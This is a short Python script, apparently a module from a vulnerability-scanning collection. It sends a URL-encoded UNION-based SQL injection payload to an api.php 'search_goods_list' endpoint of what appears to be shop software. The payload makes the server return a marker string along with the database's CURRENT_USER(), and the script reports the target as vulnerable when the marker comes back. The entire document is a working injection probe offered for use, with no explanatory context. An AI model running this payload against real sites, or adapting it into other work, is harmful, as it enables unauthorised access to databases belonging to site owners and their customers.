#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/api.php?last_modify_en_time=1&ac=1&counts=1+UNION+ALL+SELECT+NULL%2CCONCAT%280x666630303030%2CIFNULL%28CAST%28CURRENT_USER%28%29AS+CHAR%29%2C0x20%29%2C0x20%29%23&act=search_goods_list&return_data=json&last_modify_st_time=1&pages=1&api_version=1.0"
bug ="ff0000"
info ="/api.php?last_modify_en_time=1&ac=1&counts=1+UNION+ALL+SELECT+NULL%2CCONCAT%280x666630303030%2CIFNULL%28CAST%28CURRENT_USER%28%29AS+CHAR%29%2C0x20%29%2C0x20%29%23&act=search_goods_list&return_data=json&last_modify_st_time=1&pages=1&api_version=1.0"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
